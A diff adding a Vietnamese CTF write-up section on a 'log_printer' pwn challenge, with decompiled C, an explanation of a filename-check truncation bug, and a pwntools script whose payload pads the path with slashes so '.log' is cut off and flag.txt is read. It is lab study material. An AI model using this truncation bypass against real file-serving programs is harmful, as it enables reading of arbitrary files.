@@ -1209,6 +1209,108 @@ r.interactive()
 # 11
 
 </code></pre>
+<hr />
+<h2 id="log_printer"><a class="header" href="#log_printer">log_printer</a></h2>
+<h3 id="file-4"><a class="header" href="#file-4">file</a></h3>
+<pre><code class="language-shell">▶ checksec log_printer
+[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/fmt/log_printer/log_printer'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+</code></pre>
+<h3 id="source-2"><a class="header" href="#source-2">source</a></h3>
+<pre><code class="language-c">__int64 __fastcall sub_1348()
+{
+  __int64 v0; // rbp
+  int v2; // [rsp-25Ch] [rbp-264h]
+  void *v3; // [rsp-250h] [rbp-258h]
+  struct stat v4; // [rsp-248h] [rbp-250h] BYREF
+  __int64 v5; // [rsp-1B8h] [rbp-1C0h] BYREF
+  char v6[144]; // [rsp-1A8h] [rbp-1B0h] BYREF
+  char v7[264]; // [rsp-118h] [rbp-120h] BYREF
+  unsigned __int64 v8; // [rsp-10h] [rbp-18h]
+  __int64 v9; // [rsp-8h] [rbp-10h]
+
+  v9 = v0;
+  v8 = __readfsqword(0x28u);
+  memset(&amp;v5, 0, 0x10uLL);
+  memset(v7, 0, 0x100uLL);
+  sub_159A();
+  printf(&quot;file?\n&gt; &quot;);
+  v7[read(0, v7, 0x100uLL) - 1] = 0;
+  if ( (unsigned __int8)sub_14EB(v7) )
+  {
+    snprintf(v6, 0x81uLL, &quot;%s&quot;, v7);
+    v2 = open(v6, 0);
+    if ( v2 &gt;= 0 )
+    {
+      fstat(v2, &amp;v4);
+      v3 = malloc(v4.st_size);
+      read(v2, v3, v4.st_size);
+      write(1, v3, v4.st_size);
+    }
+    else
+    {
+      puts(&quot;Invalid!&quot;);
+    }
+  }
+  return 0LL;
+}
+
+
+__int64 __fastcall sub_14EB(const char *a1)
+{
+  char *v2; // [rsp+10h] [rbp-10h]
+  char *v3; // [rsp+18h] [rbp-8h]
+
+  v2 = strstr(a1, &quot;.log&quot;);
+  v3 = strchr(a1, 42);
+  if ( v2 &amp;&amp; !v3 &amp;&amp; &amp;a1[strlen(a1) - 1] - v2 == 3 )
+    return 1LL;
+  puts(&quot;Invalid log file!&quot;);
+  return 0LL;
+}
+
+</code></pre>
+<p>Bài này, sẽ nhận chuỗi input vào v7, sau đấy gọi hàm để filter input, nếu pass thì sẽ tiến hành copy v7 =&gt; v6 và open, read, write ra cho mình. Để ý kĩ thì có 1 bug là v7 được nhập 256 bytes, nhưng lúc check xong rồi copy sang v6 thì chỉ cop có 129 bytes, nên là mình có thể lợi dụng điều này để bypass check file name.</p>
+<p>Thì check sẽ filter:</p>
+<ul>
+<li>buộc có &quot;.log&quot;</li>
+<li>không chứa kí tự  * </li>
+<li>sau &quot;.log&quot; thì không có kí tự nào khác </li>
+</ul>
+<p>Thì idea để pass của mình sẽ là :</p>
+<ul>
+<li>aaa...aaaaaflag.txt.log</li>
+<li>flag.txtaaa..aaaaaa.log</li>
+</ul>
+<p>Miễn sao cho lúc copy thì cut mất đoạn .log đi, để control thành file mình muốn</p>
+<p>Sau khi vắt óc nghĩ và search làm sao để inject fmt vào blabla để ghi đè hay đẩy padding sang tham số khác, thì thầy Dương_saye lúc 2h sáng đã hint cho mình là không cần phải thế.</p>
+<blockquote>
+<p>search di
+search va suy nghi
+cai gi
+dang truoc flag.txt
+de no van truy van den file flag.txt cua folder hien tai</p>
+</blockquote>
+<p>Sau khi mò 1 hồi thì payload cho bài này của mình là:</p>
+<p>*<em>payload = b&quot;.&quot; + b&quot;/&quot;<em>119  + b&quot;flag.txt&quot; + b&quot;.log&quot;</em></em></p>
+<h3 id="exploit"><a class="header" href="#exploit">exploit</a></h3>
+<pre><code class="language-python">from pwn import *
+r = process(&quot;./log_printer&quot;)
+
+payload = b&quot;.&quot; + b&quot;/&quot;*119  + b&quot;flag.txt&quot; + b&quot;.log&quot;
+
+r.sendline(payload)
+print(r.recvline())
+
+r.interactive()
+
+</code></pre>
+<h2 id="chall1"><a class="header" href="#chall1">chall1</a></h2>
 
                     </main>
 
